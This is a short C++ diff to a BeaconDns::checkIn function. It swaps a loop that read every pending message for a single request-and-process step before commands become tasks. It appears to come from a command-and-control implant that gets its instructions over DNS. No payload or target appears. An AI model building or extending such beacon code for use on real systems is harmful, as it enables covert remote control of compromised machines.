@@ -33,12 +33,12 @@ void BeaconDns::checkIn()
 
 	m_client->sendMessage(output);
 
-	std::string input = m_client->getMsg();
-	while(!input.empty())
+	std::string input = m_client->requestMessage();
+
+	if(!input.empty())
 	{
 		SPDLOG_DEBUG("received input.size {0}", std::to_string(input.size()));
 		cmdToTasks(input);
-		input = m_client->getMsg();
 	}
 }
 
